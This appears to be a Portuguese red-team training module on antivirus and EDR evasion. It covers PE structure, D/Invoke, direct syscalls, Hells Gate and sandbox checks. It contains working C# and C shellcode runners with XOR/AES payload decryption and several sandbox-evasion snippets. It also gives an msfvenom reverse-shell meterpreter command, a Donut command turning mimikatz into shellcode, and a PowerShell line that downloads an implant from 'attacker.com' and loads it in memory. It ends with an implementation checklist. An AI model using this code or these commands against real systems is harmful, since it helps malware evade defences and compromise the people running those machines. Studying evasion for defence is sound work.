# Módulo 1: Fundamentos de Evasão de Antivírus

## 1. Estrutura Portable Executable (PE)

### Conceito
O PE é o formato padrão para executáveis no Windows 32 e 64 bits. Entender sua estrutura é crucial pois antivírus e EDRs usam análise de PE para detectar malware.

### Estrutura Básica
```
┌─────────────────────────────────┐
│ DOS Header                      │ ← Compatibilidade DOS
├─────────────────────────────────┤
│ DOS Stub                        │ ← Mensagem "This program cannot..."
├─────────────────────────────────┤
│ NT Headers                      │ ← Signature + File Header + Optional Header
├─────────────────────────────────┤
│ Section Table                   │ ← Informações de seções
├─────────────────────────────────┤
│ .text Section                   │ ← Código executável
├─────────────────────────────────┤
│ .data Section                   │ ← Dados inicializados
├─────────────────────────────────┤
│ .rsrc Section                   │ ← Recursos (ícones, strings)
├─────────────────────────────────┤
│ .reloc Section                  │ ← Informações de relocalização
├─────────────────────────────────┤
│ Import Address Table (IAT)      │ ← Ponteiros para APIs importadas
└─────────────────────────────────┘
```

### Import Address Table (IAT)
- Contém referências para todas as APIs importadas pelo executável
- **Problema:** Antivírus e EDRs usam IAT para análise heurística
- **Solução:** D/Invoke remove essas referências
- Exemplo de detecção: Chain de APIs como `VirtualAlloc → WriteProcessMemory → CreateRemoteThread`

### Como Inspecionar PE
**Ferramentas:**
- PEView
- PEBear
- Strings.exe
- Objdump

**Comando:**
```bash
# Windows
certutil -hashfile arquivo.exe SHA256
```

---

## 2. Windows APIs vs NT APIs vs Syscalls

### Hierarquia de Execução

```
Aplicação Userland
        │
        ↓
┌───────────────────────────┐
│  Win32 APIs               │  ← CreateThread, VirtualAlloc, etc.
│  (kernel32.dll)           │  ← O que antivírus monitora (Userland Hooking)
└───────────────────────────┘
        │
        ↓
┌───────────────────────────┐
│  NT APIs (Native APIs)    │  ← NtCreateThread, NtAllocateVirtualMemory
│  (ntdll.dll)              │  ← Menos monitoradas
└───────────────────────────┘
        │
        ↓
┌───────────────────────────┐
│  Syscalls (Direct)        │  ← mov eax, SSN; syscall
│  (Kernel Mode)            │  ← Difícil de monitorar, SSN muda por versão
└───────────────────────────┘
        │
        ↓
   Windows Kernel
```

### Diferenças Práticas

| Aspecto | Win32 API | NT API | Syscall |
|---------|-----------|--------|---------|
| Documentação | Completa | Limitada | Nenhuma oficial |
| Hooking | Fácil | Moderado | Difícil |
| Estabilidade | Alta | Média | Baixa (SSN muda) |
| OPSEC | Ruim | Melhor | Excelente |

### Syscall Numbers (SSN)
Os números mudam a cada release do Windows. Ferramentas como SysWhispers2 mapeiam automaticamente.

**Exemplo - Windows 10 vs Windows 11:**
```
NtAllocateVirtualMemory: 0x18 (Win10) vs diferente em Win11
```

---

## 3. Platform Invoke (P/Invoke)

### O que é?
Permite chamar funções não-gerenciadas (DLLs nativas) de código gerenciado (.NET/C#).

### Exemplo C#
```csharp
using System.Runtime.InteropServices;

[DllImport("kernel32.dll", SetLastError = true)]
private static extern IntPtr VirtualAlloc(
    IntPtr lpAddress,
    uint dwSize,
    uint flAllocationType,
    uint flProtect
);

// Uso
IntPtr alloc = VirtualAlloc(IntPtr.Zero, 1024, 0x1000, 0x04);
```

### Desvantagens
- **Visível em IAT:** A API é listada como import
- **Detectável:** Antivírus procura por padrões de execução (VirtualAlloc + WriteProcessMemory + CreateThread)
- **Strings em claro:** Nome da DLL e função aparecem no binário

### Bypass Básico: Ordinals
```csharp
// Ao invés de usar nome da função, usar número ordinal
[DllImport("kernel32.dll", EntryPoint = "#3")]
private static extern IntPtr Função(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
```

---

## 4. Dynamic Invoke (D/Invoke)

### O que é?
Executa APIs dinamicamente em runtime, sem referências estáticas na IAT.

### Fluxo de Execução
```
1. GetModuleHandle → Obter ponteiro da DLL
2. GetProcAddress → Obter endereço da função
3. Marshal.GetDelegateForFunctionPointer → Converter para delegate
4. Invocar function pointer
```

### Vantagens sobre P/Invoke
- ✅ APIs removidas de IAT
- ✅ Executadas em runtime
- ✅ Suporta manual mapping (bypassa userland hooks)
- ✅ Suporta syscalls via assembly

### Exemplo C# - D/Invoke Básico
```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate IntPtr VirtualAllocDelegate(
    IntPtr lpAddress,
    uint dwSize,
    uint flAllocationType,
    uint flProtect
);

// Resolução em runtime
IntPtr kernel32 = GetModuleHandle("kernel32.dll");
IntPtr funcAddr = GetProcAddress(kernel32, "VirtualAlloc");
VirtualAllocDelegate VA = Marshal.GetDelegateForFunctionPointer<VirtualAllocDelegate>(funcAddr);

// Execução
IntPtr alloc = VA(IntPtr.Zero, 1024, 0x1000, 0x04);
```

### D/Invoke com Syscalls
```csharp
// Obter SSN da função NT
GetSyscallStub("NtAllocateVirtualMemory", out byte[] stub);

// Converter stub em delegate
IntPtr funcPtr = Marshal.AllocHGlobal(stub.Length);
Marshal.Copy(stub, 0, funcPtr, stub.Length);

// Invocar como syscall direto
```

---

## 5. Detecção por Assinatura

### Como Funciona
1. Antivírus gera hash (MD5/SHA1/SHA256) de artefatos maliciosos conhecidos
2. Compara com banco de dados
3. Bloqueia se houver match

### Níveis de Hashing
- **File-level:** Hash do arquivo inteiro
- **Segment-level:** Hashes de seções específicas (.text, .data)
- **Byte-level:** Hashes de pequenas sequências de bytes

### Bypass Strategies

#### 1. Ofuscação de Código
```
Original: VirtualAlloc(addr, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
Ofuscado: Var1AllocationFunc(Var2, Var3, 0x1000, 0x04)
```

#### 2. Reorganização de Código
- Adicionar junk code
- Dividir funções lógicas
- Alterar ordem de instruções

#### 3. Criptografia de Payload
```csharp
// Shellcode criptografado em runtime
byte[] encryptedShellcode = LoadEncryptedPayload();
byte[] decryptedShellcode = Decrypt(encryptedShellcode, key);
// Executar decrypted payload
```

#### 4. Encontrar Assinatura Específica
**Ferramenta:** ThreatCheck, FindAVSignature

```powershell
# Exemplo: Encontrar qual parte dispara detecção
Find-AVSignature -Path .\payload.exe -AVProduct "Defender"
```

### Detecção Prática
**Ferramentas Online (com cautela):**
- VirusTotal ⚠️ Compartilha com fornecedores
- Antiscan.me (mais privado)

**Localmente:**
- Windows Defender CLI
- YARA rules
- Sigma rules

---

## 6. Shellcode Runners & Crypters

### Conceito
Programa que carrega e executa shellcode (bytecode raw) em memória.

### Estrutura Básica
```csharp
// 1. Definir shellcode
byte[] shellcode = new byte[] { 0x90, 0x90, 0xCC, ... };

// 2. Alocar memória (RW)
IntPtr alloc = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 
    0x1000, 0x04);

// 3. Copiar shellcode
Marshal.Copy(shellcode, 0, alloc, shellcode.Length);

// 4. Alterar permissões (RWX)
uint oldProtect;
VirtualProtect(alloc, (uint)shellcode.Length, 0x40, out oldProtect);

// 5. Executar
IntPtr thread = CreateThread(IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, 
    out uint threadId);
WaitForSingleObject(thread, 0xFFFFFFFF);
```

### Gerando Shellcode

**Ferramenta: msfvenom**
```bash
# msfvenom shellcode (com encoder)
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 \
  -e x86/shikata_ga_nai -f csharp -i 3

# Ou com Donut (converte DLL/EXE em shellcode)
donut -i mimikatz.exe -o shellcode.bin
```

### Criptografia de Shellcode

**Algoritmo: XOR**
```csharp
byte[] Encrypt(byte[] data, byte key) {
    byte[] result = new byte[data.Length];
    for (int i = 0; i < data.Length; i++) {
        result[i] = (byte)(data[i] ^ key);
    }
    return result;
}

// Decryption em tempo de execução
byte[] encryptedShellcode = LoadShellcode();
byte[] decryptedShellcode = Encrypt(encryptedShellcode, 0xAA);
```

**Algoritmo: AES**
```csharp
using (Aes aes = Aes.Create()) {
    aes.Key = key;
    aes.IV = iv;
    ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
    using (MemoryStream ms = new MemoryStream(encryptedShellcode)) {
        using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read)) {
            cs.Read(decryptedShellcode, 0, decryptedShellcode.Length);
        }
    }
}
```

### Bypass de Detecção de Shellcode

**Problema:** Shellcode bruto é detectado

**Solução:**
1. Criptografar + Descriptografar em runtime
2. Dividir em chunks
3. Executar sob condições (sleep detection, sandbox checks)

---

## 7. Detecção Heurística & Comportamental

### Como Funciona
Antivírus analisa **padrões de comportamento** ao invés de assinaturas:
- Que APIs são chamadas?
- Em qual ordem?
- Com quais argumentos?

### Exemplos de Comportamentos Suspeitos
```
Pattern 1: VirtualAlloc → WriteProcessMemory → CreateRemoteThread
Pattern 2: WMI Exec + cmd.exe + powershell.exe
Pattern 3: Leitura de LSASS + dump de memoria
Pattern 4: Modificação de arquivos do sistema
```

### Sandbox Evasion

#### Técnica 1: API Não Emulada
```csharp
// VirtualAllocExNuma raramente é emulada
// Se essa API "funcionar", provavelmente não está em sandbox
IntPtr result = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 
    1024, 0x1000, 0x04, 0);
if (result == IntPtr.Zero) {
    // Provavelmente sandbox
    System.Environment.Exit(0);
}
```

#### Técnica 2: Sleep Detection
```csharp
// Antivírus pode "avançar" Sleep() em sandbox
DateTime before = DateTime.Now;
System.Threading.Thread.Sleep(5000); // 5 segundos
TimeSpan elapsed = DateTime.Now - before;

if (elapsed.TotalSeconds < 4.5) {
    // Sleep foi acelerado - provavelmente sandbox
    System.Environment.Exit(0);
}
```

#### Técnica 3: Verificar Resolução de Tela
```csharp
// Sandboxes geralmente retornam 800x600
int width = GetSystemMetrics(0);  // SM_CXSCREEN
int height = GetSystemMetrics(1); // SM_CYSCREEN

if (width < 1024 || height < 768) {
    // Provavelmente sandbox
    System.Environment.Exit(0);
}
```

#### Técnica 4: Verificar Movimento do Mouse
```csharp
// Usuários reais movem o mouse; malware em sandbox não
Point p1 = new Point();
GetCursorPos(ref p1);
System.Threading.Thread.Sleep(1000);
Point p2 = new Point();
GetCursorPos(ref p2);

if (p1.X == p2.X && p1.Y == p2.Y) {
    // Mouse não se moveu - provavelmente sandbox
    System.Environment.Exit(0);
}
```

#### Técnica 5: Verificar Conexão com Internet
```csharp
// Em sandbox, qualquer domínio retorna 200
using (WebClient client = new WebClient()) {
    try {
        // Domínio inexistente
        string result = client.DownloadString("http://nonexistent-12345.com");
        if (result.Length > 0) {
            // Sandbox respondeu para domínio fake
            System.Environment.Exit(0);
        }
    } catch {
        // Conexão falhou - ambiente real
    }
}
```

---

## 8. Reflection

### Conceito
Permite carregar e executar código compilado (DLL/EXE) diretamente em memória sem arquivo no disco.

### Exemplo PowerShell
```powershell
# Baixar DLL em memória
$bytes = (New-Object System.Net.WebClient).DownloadData('http://attacker.com/implant.dll')

# Carregar em memória
[System.Reflection.Assembly]::Load($bytes) | Out-Null

# Criar instância e invocar método
$type = [Type]::GetType("Namespace.ClassName")
$method = $type.GetMethod("MainMethod", [Reflection.BindingFlags]::Public -bor [Reflection.BindingFlags]::Static)
$method.Invoke($null, @())
```

### Vantagens
- ✅ Nenhum arquivo em disco
- ✅ Execução direta em memória
- ✅ Bypass de marca "Mark of the Web"

### Desvantagens
- ❌ Pode ser monitorado por ETW
- ❌ Assemblies são carregados no AppDomain

---

## 9. EDR (Endpoint Detection & Response)

### Como EDRs Funcionam

```
┌──────────────────────┐
│  EDR Agent           │
├──────────────────────┤
│ 1. Userland Hooking  │ ← DLL injetada monitora APIs
│ 2. Kernel Driver     │ ← Monitora syscalls
│ 3. Process Monitor   │ ← Criação/morte de processo
│ 4. Network Monitor   │ ← Tráfego de rede
│ 5. File Monitoring   │ ← Modificações de arquivo
│ 6. Registry Monitor  │ ← Alterações no registro
│ 7. Memory Scanning   │ ← Análise de memória
└──────────────────────┘
        │
        ↓
  Machine Learning
    Behavioral Analysis
        │
        ↓
   ☁️ Cloud Backend
   (Threat Intelligence)
```

### Userland Hooking
EDR injeta DLL que intercepta:
- CreateProcess
- CreateThread
- VirtualAllocEx
- WriteProcessMemory
- RegSetValueEx
- etc.

### Bypass Techniques

#### 1. System Call Obfuscation (SSN)
Chamar NtAPIs diretamente via syscall ao invés de DLLs hooked

#### 2. Manual Mapping
Carregar DLL sem usar LoadLibrary (evita hook de kernel)

#### 3. Hook Removal
Restaurar original da DLL (perigoso - pode gerar alertas)

#### 4. Syscall Stubs via D/Invoke
```csharp
// D/Invoke com syscall stub (não passa por userland hooks)
GetSyscallStub("NtAllocateVirtualMemory", out byte[] stub);
// Executar directamente com syscall
```

---

## 10. Hells Gate & TartarusGate

### Hells Gate - Resolução de SSN

**Problema:** SSNs mudam a cada release do Windows

**Solução:** Resolver SSNs em runtime via:
1. PEB (Process Environment Block) walking
2. EAT (Export Address Table) parsing
3. Hashing de nomes de função (djb2 hash)

### Fluxo Hells Gate
```
1. Acessar TEB → PEB
2. PEB Walking → Encontrar ntdll.dll
3. Parse EAT → Encontrar função desejada
4. Hash do nome → Comparar com entrada EAT
5. Extrair SSN da função
6. Comparar assembly com hook detection
7. Executar syscall com SSN correto
```

### Implementação C
```c
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

// Hells Gate resolve SSN automaticamente
// Uso é transparente para o desenvolvedor
```

### TartarusGate (Variação Avançada)
Resolve SSNs mesmo que ntdll seja hooked:
- Lê ntdll do disco
- Compara com versão em memória
- Detecta hooks por comparação de bytes
- Usa versão não-hooked se possível

---

## 11. Linux Evasion

### Diferenças vs Windows
- Menos soluções EPP/EDR maduras
- Mais baseado em YARA/Sigma rules
- ClamAV é comum
- Auditd monitora syscalls

### Techniques
1. **Polymorphic Shellcode:** Shellcode que muda a cada execução
2. **Criptografia:** Criptografar payload com XOR/AES
3. **Syscall Direct:** Chamar syscalls diretamente sem libc
4. **Binary Obfuscation:** UPX, custom packing

### Exemplo: Shellcode Runner em C (sem APIs)
```c
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>

int main() {
    unsigned char shellcode[] = {
        0x7f, 0x45, 0x4c, 0x46, ... // ELF header
    };
    
    // Alocar + executar
    void *mem = mmap(NULL, sizeof(shellcode), 
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    memcpy(mem, shellcode, sizeof(shellcode));
    ((void(*)())mem)();
    
    munmap(mem, sizeof(shellcode));
    return 0;
}
```

---

## 🎯 Checklist de Implementação

- [ ] Estrutura PE entendida
- [ ] APIs Windows vs NT APIs diferenciadas
- [ ] P/Invoke vs D/Invoke compreendidos
- [ ] Shellcode gerado e testado
- [ ] Criptografia de payload implementada
- [ ] Bypass de detecção heurística testado
- [ ] Sandbox evasion técnicas validadas
- [ ] EDR bypasses compreendidos
- [ ] Hells Gate ou similar implementado
- [ ] Testes contra Windows Defender realizados

---

## 📊 Matriz de Dificuldade vs Efetividade

| Técnica | Dificuldade | Efetividade | OPSEC |
|---------|------------|-------------|-------|
| P/Invoke | Baixa | Baixa | Ruim |
| D/Invoke | Média | Média-Alta | Bom |
| Syscall Direto | Alta | Alta | Excelente |
| Manual Mapping | Alta | Alta | Excelente |
| Hells Gate | Muito Alta | Muito Alta | Excelente |
| Sandbox Evasion | Média | Média | Bom |
